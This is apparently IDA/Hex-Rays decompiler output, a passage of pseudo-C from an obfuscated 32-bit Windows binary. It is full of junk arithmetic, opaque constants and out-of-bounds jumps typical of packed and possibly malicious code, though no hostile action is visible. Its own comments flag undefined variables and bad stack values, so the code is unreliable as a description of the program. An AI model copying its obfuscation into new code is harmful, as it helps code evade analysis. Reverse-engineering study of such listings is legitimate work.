  sub_41225B(57, 1203005452);
  v13 = (((v10 | 0x32CE) + 8138) ^ 0x30CB) - 10514;
  if ( !v12 )
    v40 |= v13;
  sub_412D0E((unsigned int)v30, v11, 0, v50, (int)v30, 0);
  v25 = sub_412196(24, 55, 6, v24);
  v26 = __CFADD__(v25 & 0x1471, 6930) + (v25 & 0x1471) + 6930 + 6381;
  if ( v26 )
  {
    v27 = v26 + 10662 + __CFADD__(v26, 10662) + v26 + 10662;
    v32 += __CFADD__(v27, v27) + 2 * v27 + 11951 - v39;
  }
  sub_412D0E(0, 0, 0, 0, (int)v42, 0);
  sub_412196(18, 30, 27, 523042573);
  sub_412D0E(0, v5, 0, v5, (int)v37, 0);
  sub_413234((int)v36, 0, 33, 29);
  v28 = dword_444832;
  sub_41225B(27, v39);
  v17 = sub_4138E5(33, (int)v45);
  v20 = sub_414FB7(v17, v18, v19);
  sub_41225B(61, v20 + v21 + v20);
  v38 &= v22 + 14576;
  sub_412D0E(v14, 0, 0, v14, (int)v44, 0);
  sub_413234((int)v46, 0, 26, 61);
  sub_4138E5(64, (int)v33);
  LOBYTE(dword_443030) = 107;
  dword_444832 = v28 - 1;
  v15 = sub_4138E5(62, (int)v31);
  sub_41225B(7, v15);
  sub_412D0E(v16, 0, 0, v16, (int)v29, 0);
  sub_413234((int)v35, 0, 53, 1);
  sub_41225B(24, v6);
  if ( !v7 )
  {
    v9 = ((_WORD)v49 + 7321) & 0x31A;
    v21 = v34 < v9;
    v34 -= v9;
    v23 = v21 + v9 + 14551;
    if ( (v8 & 0xD48) == 0 && v8 >= v48 )
      v41 |= v23 - 1124;
  }
  JUMPOUT(0x4136E5);
}
// 413E09: control flows out of bounds to 4136E5
// 411E38: variable 'v3' is possibly undefined
// 411E5D: variable 'v4' is possibly undefined
// 4123B0: variable 'v7' is possibly undefined
// 413050: variable 'v10' is possibly undefined
// 413066: variable 'v12' is possibly undefined
// 412167: variable 'v5' is possibly undefined
// 413B9F: variable 'v18' is possibly undefined
// 413B9F: variable 'v19' is possibly undefined
// 413BA4: variable 'v21' is possibly undefined
// 413BAE: variable 'v22' is possibly undefined
// 4134D8: variable 'v14' is possibly undefined
// 4135EB: variable 'v16' is possibly undefined
// 412373: variable 'v6' is possibly undefined
// 413E54: variable 'v8' is possibly undefined
// 4148D6: variable 'v11' is possibly undefined
// 414FF1: variable 'v24' is possibly undefined
// 443030: using guessed type int dword_443030;
// 444832: using guessed type int dword_444832;

//----- (00412D0E) --------------------------------------------------------
int __fastcall sub_412D0E(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6)
{
  __int16 v6; // ax
  int v7; // eax
  char v8; // cf
  unsigned int v9; // edx
  unsigned int v10; // ecx
  unsigned int v11; // edx
  unsigned int v12; // ecx
  int v13; // eax
  unsigned int v14; // edx
  unsigned int v15; // ecx
  __int16 v17; // [esp-98h] [ebp-9Ch]

  v6 = v17;
  if ( (v17 & 0x143E) != 0 || v17 )
    v6 = (v17 - 11350) & 0x340D;
  v7 = sub_414FB7(v6 & 0x49D, a2, a1);
  sub_414FB7(v7 - (v8 + 2279), v9, v10);
  v13 = sub_414FB7(0, v11, v12);
  return sub_414FB7(v8 + v13 + 274, v14, v15);
}
// 412BE0: variable 'v17' is possibly undefined
// 412E19: variable 'v8' is possibly undefined
// 412E1E: variable 'v9' is possibly undefined
// 412E1E: variable 'v10' is possibly undefined
// 412E25: variable 'v11' is possibly undefined
// 412E25: variable 'v12' is possibly undefined
// 414999: variable 'v14' is possibly undefined
// 414999: variable 'v15' is possibly undefined

//----- (00413234) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __cdecl sub_413234(int a1, int a2, int a3, int a4)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_414566((int)&savedregs, a1, a2, a3, a4);
}
// 413237: bad sp value at call

//----- (0041357B) --------------------------------------------------------
int __stdcall sub_41357B(int a1, int a2, int a3)
{
  int v4; // [esp+68h] [ebp-22Ch]
  char v5[4]; // [esp+B0h] [ebp-1E4h] BYREF
  char v6[16]; // [esp+194h] [ebp-100h] BYREF
  char v7[60]; // [esp+1A4h] [ebp-F0h] BYREF

  sub_41362A(0, v4);
  sub_411F08();
  sub_413234((int)v5, 0, 24, 8);
  sub_411F08();
  sub_411F08();
  sub_413234((int)v7, 0, 35, 53);
  return sub_4138E5(30, (int)v6);
}
// 41358D: variable 'v4' is possibly undefined

//----- (0041362A) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __stdcall sub_41362A(int a1, int a2)
{
  int v2; // ecx
  int result; // eax
  unsigned int v4; // edx
  __int16 v5; // cx
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int v11; // eax
  char v12; // cf
  unsigned int v13; // edx
  unsigned int v14; // ecx
  int v15[3]; // [esp+198h] [ebp-100h] BYREF
  int v16[3]; // [esp+1E4h] [ebp-B4h] BYREF
  int v17; // [esp+1F8h] [ebp-A0h]
  int v18; // [esp+264h] [ebp-34h]
  int v19; // [esp+288h] [ebp-10h]

  sub_4138E5(7, (int)v15);
  sub_413A20();
  v7 = ((2 * v6) ^ 0x24D7) - 10370 + 5749;
  v17 += v7;
  v8 = v7 | 0x7CD;
  if ( (v5 & 0x136B) != 0 )
    v8 -= 6272;
  v11 = sub_412D0E((unsigned int)v16, v4, 0, v16[2] | v8, (int)v16, 0);
  sub_414FB7(v12 + v11 + 4693, v13, v14);
  sub_412196(22, 49, 19, 1057969774);
  sub_414FB7(12010, v9, v10);
  sub_412196(15, 35, 7, 186023180);
  result = 5494;
  if ( v18 != v2 )
    result = (unsigned __int16)v19 | 0x1D4;
  return result;
}
// 41343C: conditional instruction was optimized away because of 'eax.4>=7CDu'
// 414908: bad sp value at call
// 412EF4: variable 'v6' is possibly undefined
// 414908: variable 'v4' is possibly undefined
// 41490D: variable 'v12' is possibly undefined
// 414917: variable 'v13' is possibly undefined
// 414917: variable 'v14' is possibly undefined
// 414675: variable 'v9' is possibly undefined
// 414675: variable 'v10' is possibly undefined
// 413CAB: variable 'v5' is possibly undefined
// 4143B8: variable 'v2' is possibly undefined

//----- (004138E5) --------------------------------------------------------
int __stdcall sub_4138E5(int a1, int a2)
{
  unsigned int v2; // edx
  int v3; // eax
  unsigned int v4; // edx
  unsigned int v5; // ecx
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  int v9; // eax
  char v10; // cf
  unsigned int v12; // edx
  char v13[52]; // [esp+84h] [ebp-348h] BYREF
  char v14[16]; // [esp+178h] [ebp-254h] BYREF
  char v15[360]; // [esp+188h] [ebp-244h] BYREF
  int v16; // [esp+2F0h] [ebp-DCh]

  sub_411F08();
  sub_412D0E((unsigned int)v14, v12, 0, 1669981493, (int)v14, 0);
  sub_412D0E(0, 0, 0, (int)v15, (int)v15, 0);
  sub_411F08();
  v3 = sub_412D0E(0, v2, 0, v16, (int)v13, 0);
  v6 = sub_414FB7(v3 ^ 0x3E25, v4, v5);
  v9 = sub_414FB7(v6 + 16133, v7, v8);
  return v9 + v10 + v9;
}
// 414A34: variable 'v12' is possibly undefined
// 413EB4: variable 'v2' is possibly undefined
// 413EC3: variable 'v4' is possibly undefined
// 413EC3: variable 'v5' is possibly undefined
// 413ECD: variable 'v7' is possibly undefined
// 413ECD: variable 'v8' is possibly undefined
// 413ED2: variable 'v10' is possibly undefined

//----- (00413A20) --------------------------------------------------------
void sub_413A20()
{
  JUMPOUT(0x413632);
}
// 413A23: control flows out of bounds to 413632

//----- (00413DCA) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_413DCA(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // ecx
  int v4; // edx
  char v5[128]; // [esp+4h] [ebp-108h] BYREF
  char v6[136]; // [esp+84h] [ebp-88h] BYREF

  sub_414FB7(a1, a2, a3);
  sub_413234((int)v5, 0, 2, 36);
  sub_41225B(17, v4);
  sub_4138E5(4, (int)v6);
  sub_403835(v3, dword_44482E);
  __asm { retn }
}
// 4015E3: positive sp value 4 has been found
// 414299: variable 'v4' is possibly undefined
// 4015D0: variable 'v3' is possibly undefined
// 44482E: using guessed type int dword_44482E;
// 444866: using guessed type int dword_444866;
// 444872: using guessed type int dword_444872;

//----- (0041405B) --------------------------------------------------------
int __usercall sub_41405B@<eax>(int a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6)
{
  return sub_414E6C(a1, a2, a3, a4, a5, a6);
}

//----- (00414566) --------------------------------------------------------
int __userpurge sub_414566@<eax>(int a1@<ebp>, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // edx
  unsigned int v6; // ecx
  __int16 v7; // ax
  int v8; // edx
  bool v9; // cf
  int v10; // eax
  int v11; // ecx
  unsigned int v12; // eax
  unsigned int v13; // ett
  int result; // eax
  unsigned int v15; // eax
  int v16; // eax

  sub_411F08();
  v7 = sub_414FB7(
         2 * ((v16 | 0x360F) - 20316) - (__CFADD__((v16 | 0x360F) - 20316, (v16 | 0x360F) - 20316) + 2507),
         v5,
         v6);
  v10 = (v7 + v9 + v7) & 0x303F;
  if ( (v11 & v10) == 0 )
  {
    v12 = v10 + 9978;
    v9 = v12 < 0x1D33;
    v12 -= 7475;
    v13 = v9 + 4614;
    result = v12
           - v13
           + (v12 < v13)
           + v12
           - v13
           - ((__CFADD__(v12 < v13, v12 - v13) | __CFADD__(v12 - v13, (v12 < v13) + v12 - v13))
            + 15844);
    if ( !v8 )
      return result;
    v10 = *(_DWORD *)(a1 - 28) & 0x1261 | 0x23BB;
  }
  v15 = v10 + 1782;
  return (v15 < 0x21C8)
       + v15
       - 8648
       + 5526
       - ((__CFADD__(v15 < 0x21C8, v15 - 8648) | __CFADD__((v15 < 0x21C8) + v15 - 8648, 5526))
        + 9122);
}
// 41457A: variable 'v16' is possibly undefined
// 412C1C: variable 'v5' is possibly undefined
// 412C1C: variable 'v6' is possibly undefined
// 412C21: variable 'v9' is possibly undefined
// 412C34: variable 'v11' is possibly undefined
// 412C54: variable 'v8' is possibly undefined

//----- (00414E31) --------------------------------------------------------
int __stdcall sub_414E31(int a1, int a2, int a3)
{
  int v3; // eax
  unsigned int v4; // edx
  unsigned int v5; // ecx
  int v6; // ecx
  unsigned int v7; // eax
  int v8; // edx
  __int16 v9; // dx
  __int16 v10; // ax
  int v11; // edx
  char v12; // cf
  __int16 v13; // ax
  int result; // eax
  unsigned int v15; // edx
  int v16; // ecx
  int v17; // eax
  unsigned int v18; // edx
  unsigned int v19; // ecx
  unsigned __int16 v20; // [esp+34h] [ebp-218h]
  int v21; // [esp+64h] [ebp-1E8h]
  char v22[4]; // [esp+D4h] [ebp-178h] BYREF
  char v23[12]; // [esp+D8h] [ebp-174h] BYREF
  int v24; // [esp+F4h] [ebp-158h]
  int v25; // [esp+154h] [ebp-F8h]
  char v26[108]; // [esp+1B0h] [ebp-9Ch] BYREF
  int v27; // [esp+21Ch] [ebp-30h]
  int v28; // [esp+23Ch] [ebp-10h]

  sub_412196(32, 49, 49, 465181835);
  sub_412D0E((unsigned int)v23, 0, 0, v25, (int)v23, 0);
  if ( v15 == v16 && !v15 )
    v24 ^= v26[36] & 0x70;
  v3 = sub_412D0E((unsigned int)v23, v15, 0, -2084630040, (int)v23, 0);
  sub_414FB7(v3 | 0x2161, v4, v5);
  sub_41225B(30, v6);
  sub_41357B(v8, 0, (v7 < 0x2F3B) + v7 - 12091 + 13517);
  sub_413A20();
  sub_413A20();
  sub_411F08();
  sub_414FB7(v17, v18, v19);
  sub_412D0E((unsigned int)v26, 0, 0, v27, (int)v26, 0);
  v10 = sub_41405B((int)v22, v9, v21, 1345616562, (int)v22, 0);
  v13 = 2 * (v10 - (v12 + 13628));
  result = v13 & 0x161D;
  if ( (v11 & v28) == 0 )
    result = v20;
  return result;
}
// 413212: variable 'v15' is possibly undefined
// 413B0B: variable 'v11' is possibly undefined
// 4133E3: variable 'v20' is possibly undefined
// 41283A: variable 'v4' is possibly undefined
// 41283A: variable 'v5' is possibly undefined
// 412C87: variable 'v6' is possibly undefined
// 412C9B: variable 'v8' is possibly undefined
// 412C8C: variable 'v7' is possibly undefined
// 414AE6: variable 'v17' is possibly undefined
// 414AE6: variable 'v18' is possibly undefined
// 414AE6: variable 'v19' is possibly undefined
// 413AEE: variable 'v9' is possibly undefined
// 413AEE: variable 'v21' is possibly undefined
// 413AF3: variable 'v12' is possibly undefined
// 414433: variable 'v16' is possibly undefined

//----- (00414E6C) --------------------------------------------------------
int __userpurge sub_414E6C@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6)
{
  if ( (a2 & 0x327B) == 0 )
    result = (((_WORD)result + 2005) & 0x1E01)
           + 6363
           + __CFADD__(((_WORD)result + 2005) & 0x1E01, 6363)
           + (((_WORD)result + 2005) & 0x1E01)
           + 6363;
  return result;
}

//----- (00414FB7) --------------------------------------------------------
int __usercall sub_414FB7@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // eax
  int v4; // eax
  unsigned int v6; // eax
  bool v7; // cf
  unsigned int v8; // eax
  int v9; // [esp-194h] [ebp-198h]
  unsigned int v10; // [esp-188h] [ebp-18Ch]

  v6 = a1 ^ 0x1649;
  if ( v10 <= a3 )
    v6 = (v6 ^ 0x1CB9) + 8701;
  v7 = v6 < 0x1FA2;
  v8 = v6 - 8098;
  v3 = (__PAIR64__(v8 - (v7 + 8742), v8) - (((unsigned int)v7 + 8742) | 0x303000000000i64)) >> 32;
  v4 = ((2 * v3 - (__CFADD__(v3, v3) + v9)) ^ 0x3376 | 0x28CC) + 1779;
  if ( a2 < a3 )
    goto LABEL_5;
  if ( a2 )
  {
    v4 = 0;
LABEL_5:
    v4 += 7340;
  }
  return v4 | 0x3776;
}
// 41243D: variable 'v9' is possibly undefined
// 41494C: variable 'v10' is possibly undefined

//----- (00418D0E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_418D0E@<eax>(_BYTE *a1@<edi>)
{
  int v1; // eax
  char v2; // cf

  v1 = MEMORY[0x48C8D2BE]();
  *a1 = v1;
  return v2 + v1 - 1528354826;
}
// 418D12: positive sp value 2E2A has been found
// 418D1A: variable 'v2' is possibly undefined

// nfuncs=37 queued=37 decompiled=37 lumina nreq=0 worse=0 better=0
// ALL OK, 37 function(s) have been successfully decompiled
